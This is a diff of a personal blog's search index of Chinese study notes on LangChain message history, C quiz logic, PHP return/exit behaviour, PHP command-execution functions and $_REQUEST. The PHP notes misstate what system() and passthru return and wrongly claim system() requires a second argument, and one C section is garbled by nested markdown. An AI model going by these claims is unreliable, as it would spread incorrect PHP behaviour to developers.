-<li><pre><code class="language-python"># 先写 InMemoryMessageHistory，对获取的消息进行处理并获取历史记录列表！
-    class InMemoryMessageHistory(BaseChatMessageHistory, BaseModel):
-        messages: List[BaseMessage] = Field(default_factory=list)
-
-        # 添加并处理对话记录
-        def add_message(self, message: BaseMessage) -&gt; None:
-            self.messages.append(message)
-
-        def clear(self) -&gt; None:
-            self.messages = []
-</code></pre>
-</li>
-<li><p>这里为什么将总消息列表设置为元素均受<code>BaseMessage</code>类的列表呢?</p>
-</li>
-<li><p>原因:</p>
-</li>
-<li><p><strong>作为通用的消息基类</strong>：<code>BaseMessage</code>是一个基类，它定义了消息的基本结构和行为，是<code>HumanMessage</code>和<code>AIMessage</code>等具体消息类型的父类。使用<code>BaseMessage</code>作为类型提示，表示<code>messages</code>列表可以包含各种具体类型的消息对象，只要它们是<code>BaseMessage</code>的子类。这样可以实现多态性，使得代码更加灵活和可扩展。比如，后续如果需要添加其他类型的消息，如系统消息<code>SystemMessage</code>等，只要让新的消息类继承自<code>BaseMessage</code>，就可以方便地将其添加到<code>messages</code>列表中。</p>
-</li>
-<li><p><strong>统一的存储和处理</strong>：将不同类型的消息统一存储在以<code>BaseMessage</code>为类型的列表中，便于对消息进行统一的处理和操作。例如，可以遍历<code>messages</code>列表，无论其中的消息是<code>HumanMessage</code>还是<code>AIMessage</code>，都可以通过<code>BaseMessage</code>定义的公共接口来访问消息的属性和方法，如获取消息内容等。这样可以避免为不同类型的消息编写重复的处理代码，提高代码的复用性和可维护性。</p>
-</li>
-<li><p><strong>符合面向对象设计原则</strong>：遵循了面向对象编程中的里氏替换原则，即子类对象可以在不影响程序正确性的前提下，替换父类对象在程序中的位置。使用<code>BaseMessage</code>作为列表元素的类型，意味着在使用<code>messages</code>列表的地方，可以透明地处理任何<code>BaseMessage</code>子类的对象，而不需要针对具体的子类进行特殊的判断和处理，使得代码结构更加清晰，耦合度更低。</p>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>langchain</tag>
       </tags>
   </entry>
   <entry>
@@ -1646,14 +1563,47 @@ void main()
     &#125;
     printf(&quot;%d\n&quot;,k);
 &#125;
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 以上程序的执行逻辑：</span><br><span class="line"></span><br><span class="line">* * 首先`i%3`的值为`1`,在`case 1: k++;break;`这个地方跳出`switch`循环。</span><br><span class="line">  * 之后`i`变为`2`,此时在`case 2`这个位置开始执行代码，`continue`语句使得代码重新返回`for`循环开头,</span><br><span class="line">  * 此时可以发现，`i`的值为`2`，会一直在`case 2`这个语句发生`continue`。无限循环。</span><br><span class="line">  * **我们值得注意的就是`continue`优先执行在`for`或者`while`这样的循环语句中**,在这道题里面，`continue`针对于`for`进行跳出。</span><br><span class="line">  * 所以给我们造成了一个错觉，这里的`continue`似乎是把`switch`语句跳过了，其实本质上还是回到`for`循环开头并且没有执行`for`循环里面`continue`后面的语句.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 运算符</span><br><span class="line"></span><br><span class="line">#### 算术运算符</span><br><span class="line"></span><br><span class="line">* `%`运算符</span><br><span class="line"></span><br><span class="line">* * 在 C 语言中，`%`是取模运算符，用于计算两个整数相除后的余数 ，其运算规则为：`a % b`（`a`、`b` 为整数，`b≠0`）的结果是 `a` 除以 `b` 得到商后剩下的余数。</span><br><span class="line"></span><br><span class="line">    对于`2 % 9`，`2`除以`9`，因为`2`小于`9`，不够除，此时商为`0` ，根据 “余数 = 被除数 - 商 × 除数” 的公式，即`2 - 0×9 = 2` ，所以`2 % 9`的结果是`2`。**这里太重要了**</span><br><span class="line"></span><br><span class="line">  * **记住:商为0的时候，余数就为被除数（这里是2）它本身**</span><br><span class="line"></span><br><span class="line">##### 执行顺序</span><br><span class="line"></span><br><span class="line">* 例题</span><br><span class="line">* &#123;% asset_img image-20250326140107842.png image-20250326140107842 %&#125;</span><br><span class="line">* 这里我们要考虑结合性，即程序是从左到右运行的。</span><br><span class="line">* &#123;% asset_img image-20250326140158692.png image-20250326140158692 %&#125;</span><br><span class="line"></span><br><span class="line">#### 逻辑运算符</span><br><span class="line"></span><br><span class="line">##### 关系运算符</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20250302154241750.png image-20250302154241750 %&#125;</span><br><span class="line"></span><br><span class="line">* 如</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  b = (-1)&amp;&amp;(-1)</span><br></pre></td></tr></table></figure>
 </code></pre>
 </li>
-<li><p>这种情况下,<code>b</code>值为<code>1</code>(True)。</p>
+<li><p>以上程序的执行逻辑：</p>
+</li>
+<li><ul>
+<li>首先<code>i%3</code>的值为<code>1</code>,在<code>case 1: k++;break;</code>这个地方跳出<code>switch</code>循环。</li>
+<li>之后<code>i</code>变为<code>2</code>,此时在<code>case 2</code>这个位置开始执行代码，<code>continue</code>语句使得代码重新返回<code>for</code>循环开头,</li>
+<li>此时可以发现，<code>i</code>的值为<code>2</code>，会一直在<code>case 2</code>这个语句发生<code>continue</code>。无限循环。</li>
+<li><strong>我们值得注意的就是<code>continue</code>优先执行在<code>for</code>或者<code>while</code>这样的循环语句中</strong>,在这道题里面，<code>continue</code>针对于<code>for</code>进行跳出。</li>
+<li>所以给我们造成了一个错觉，这里的<code>continue</code>似乎是把<code>switch</code>语句跳过了，其实本质上还是回到<code>for</code>循环开头并且没有执行<code>for</code>循环里面<code>continue</code>后面的语句.</li>
+</ul>
 </li>
 </ul>
-<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">char</span> *s, <span class="type">char</span> *t)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> ((*s) &amp;&amp; (*t) &amp;&amp; (*t++ == *s++));<span class="comment">//这里是先将t和s所指向的第一个字符进行比较之后再后移一位。</span></span><br><span class="line">    <span class="keyword">return</span> (*s - *t);<span class="comment">//返回两后移一位的字符的ASCII🐎的差值。所以是在比较大小。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><ul>
+<li><p><code>%</code>运算符</p>
+</li>
+<li><ul>
+<li><p>在 C 语言中，<code>%</code>是取模运算符，用于计算两个整数相除后的余数 ，其运算规则为：<code>a % b</code>（<code>a</code>、<code>b</code> 为整数，<code>b≠0</code>）的结果是 <code>a</code> 除以 <code>b</code> 得到商后剩下的余数。</p>
+<p>对于<code>2 % 9</code>，<code>2</code>除以<code>9</code>，因为<code>2</code>小于<code>9</code>，不够除，此时商为<code>0</code> ，根据 “余数 &#x3D; 被除数 - 商 × 除数” 的公式，即<code>2 - 0×9 = 2</code> ，所以<code>2 % 9</code>的结果是<code>2</code>。<strong>这里太重要了</strong></p>
+</li>
+<li><p><strong>记住:商为0的时候，余数就为被除数（这里是2）它本身</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h5><ul>
+<li>例题</li>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250326140107842.png" class="" title="image-20250326140107842"></li>
+<li>这里我们要考虑结合性，即程序是从左到右运行的。</li>
+<li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250326140158692.png" class="" title="image-20250326140158692"></li>
+</ul>
+<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h5><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302154241750.png" class="" title="image-20250302154241750">
 
+<ul>
+<li><p>如</p>
+</li>
+<li><pre><code class="language-c">b = (-1)&amp;&amp;(-1)
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这种情况下,`b`值为`1`(True)。</span><br><span class="line"></span><br><span class="line">###### 例子</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int fun(char *s, char *t) &#123;</span><br><span class="line">    while ((*s) &amp;&amp; (*t) &amp;&amp; (*t++ == *s++));//这里是先将t和s所指向的第一个字符进行比较之后再后移一位。</span><br><span class="line">    return (*s - *t);//返回两后移一位的字符的ASCII🐎的差值。所以是在比较大小。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
 <h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><ul>
 <li><p>有关异或运算符<code>^</code>的例子:</p>
 </li>
@@ -1844,7 +1794,7 @@ int main()&#123;
 </ul>
 <h4 id="自定义数据结构里面的指针"><a href="#自定义数据结构里面的指针" class="headerlink" title="自定义数据结构里面的指针"></a>自定义数据结构里面的指针</h4><ul>
 <li>有以下例题:</li>
-<li><style>.tjcttbyyhzdc{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="tjcttbyyhzdc" alt="image-20250305135039466"></li>
+<li><style>.qyepuuixcylj{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="qyepuuixcylj" alt="image-20250305135039466"></li>
 <li>要点一:对于<code>struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;</code>这里由于该结构在初始化的时候，需要两个值来初始化，所以<code>5,&amp;a[0]</code>就构成了数组<code>a</code>的第一个元素<code>a[0]</code>的初始化内容 ，<code>6,&amp;a[1]</code> 、<code>7,&amp;a[2]</code>分别对应<code>a[1]</code>和<code>a[2]</code>的初始化内容。</li>
 <li>要点二:这里对<code>st</code>数据结构数组的值的导入，比如:<code>5,&amp;a[0]</code>,这里第二个值为<code>&amp;a[0]</code>，就是对<code>st *next</code>的赋值，即指向的下一个元素是它本身。</li>
 <li>要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</li>
@@ -2152,6 +2102,89 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
+    <title>if代码执行机制</title>
+    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
+<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
+<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
+<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再在另外一个文件中包含它:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只会输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
+<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
+<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php条件函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux基础</title>
+    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基本符号</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>langchain历史记录管理</title>
+    <url>/2025/02/20/langchain%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h1 id="langchain历史记录管理"><a href="#langchain历史记录管理" class="headerlink" title="langchain历史记录管理"></a>langchain历史记录管理</h1><h2 id="输入的消息类型"><a href="#输入的消息类型" class="headerlink" title="输入的消息类型:"></a>输入的消息类型:</h2><ul>
+<li><p>关于Message的基本介绍可用看这:<a href="https://python.langchain.com.cn/docs/modules/model_io/models/chat/">langchain基本Messages</a></p>
+</li>
+<li><p>这里说说基本的用法(重在区别BaseMessage,HumanMessage,AIMessage)</p>
+</li>
+<li><ul>
+<li><p>如以下代码:</p>
+</li>
+<li><pre><code class="language-python"># 先写 InMemoryMessageHistory，对获取的消息进行处理并获取历史记录列表！
+    class InMemoryMessageHistory(BaseChatMessageHistory, BaseModel):
+        messages: List[BaseMessage] = Field(default_factory=list)
+
+        # 添加并处理对话记录
+        def add_message(self, message: BaseMessage) -&gt; None:
+            self.messages.append(message)
+
+        def clear(self) -&gt; None:
+            self.messages = []
+</code></pre>
+</li>
+<li><p>这里为什么将总消息列表设置为元素均受<code>BaseMessage</code>类的列表呢?</p>
+</li>
+<li><p>原因:</p>
+</li>
+<li><p><strong>作为通用的消息基类</strong>：<code>BaseMessage</code>是一个基类，它定义了消息的基本结构和行为，是<code>HumanMessage</code>和<code>AIMessage</code>等具体消息类型的父类。使用<code>BaseMessage</code>作为类型提示，表示<code>messages</code>列表可以包含各种具体类型的消息对象，只要它们是<code>BaseMessage</code>的子类。这样可以实现多态性，使得代码更加灵活和可扩展。比如，后续如果需要添加其他类型的消息，如系统消息<code>SystemMessage</code>等，只要让新的消息类继承自<code>BaseMessage</code>，就可以方便地将其添加到<code>messages</code>列表中。</p>
+</li>
+<li><p><strong>统一的存储和处理</strong>：将不同类型的消息统一存储在以<code>BaseMessage</code>为类型的列表中，便于对消息进行统一的处理和操作。例如，可以遍历<code>messages</code>列表，无论其中的消息是<code>HumanMessage</code>还是<code>AIMessage</code>，都可以通过<code>BaseMessage</code>定义的公共接口来访问消息的属性和方法，如获取消息内容等。这样可以避免为不同类型的消息编写重复的处理代码，提高代码的复用性和可维护性。</p>
+</li>
+<li><p><strong>符合面向对象设计原则</strong>：遵循了面向对象编程中的里氏替换原则，即子类对象可以在不影响程序正确性的前提下，替换父类对象在程序中的位置。使用<code>BaseMessage</code>作为列表元素的类型，意味着在使用<code>messages</code>列表的地方，可以透明地处理任何<code>BaseMessage</code>子类的对象，而不需要针对具体的子类进行特殊的判断和处理，使得代码结构更加清晰，耦合度更低。</p>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ai</category>
+      </categories>
+      <tags>
+        <tag>langchain</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>numpy库学习(持续更新)</title>
     <url>/2025/02/02/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="numpy库学习-持续更新"><a href="#numpy库学习-持续更新" class="headerlink" title="numpy库学习(持续更新"></a>numpy库学习(持续更新</h1><h2 id="array多维数组概念"><a href="#array多维数组概念" class="headerlink" title="array多维数组概念"></a>array多维数组概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>多维数组是一种包含多个维度的数据集合，每个维度可以看作是一个方向，类似于数学中的坐标轴。一维数组可以想象成一条直线上的点的集合，二维数组类似一个平面上的网格，三维数组则像是一个立体空间中的立方体网格，以此类推，可以有更高维度的数组。</p>
@@ -2246,27 +2279,6 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
-    <title>php命令执行函数详解</title>
-    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
-<ul>
-<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
-<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
-<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
-<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>命令执行函数</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pandas库学习(持续更新)</title>
     <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
@@ -2315,6 +2327,43 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
+    <title>php命令执行函数详解</title>
+    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
+<ul>
+<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
+<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
+<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
+<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>命令执行函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php超全局变量特性注解</title>
+    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
+    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>我们直接在url里面加上:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
+<p>就可以让$_REQUEST变量接收到传递的参数。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php超全局变量</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php字符串处理函数</title>
     <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
@@ -2348,22 +2397,6 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
-    <title>php超全局变量特性注解</title>
-    <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h3 id="php超全局变量特性注解"><a href="#php超全局变量特性注解" class="headerlink" title="php超全局变量特性注解"></a>php超全局变量特性注解</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>1.它最大的特点就是,$_REQUEST超全局变量为一个复合变量,它可以接受来自于$_GET、$_POST 和 $_COOKIE 传递过来的值。<br>2.它的设计初衷是为了方便开发者在处理用户输入时，无需关心数据是通过哪种方式提交的，都能统一获取。<br>3.所以如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&quot;file&quot;</span>];</span><br></pre></td></tr></table></figure>
-<p>我们直接在url里面加上:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=xxx</span><br></pre></td></tr></table></figure>
-<p>就可以让$_REQUEST变量接收到传递的参数。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php超全局变量</tag>
-      </tags>
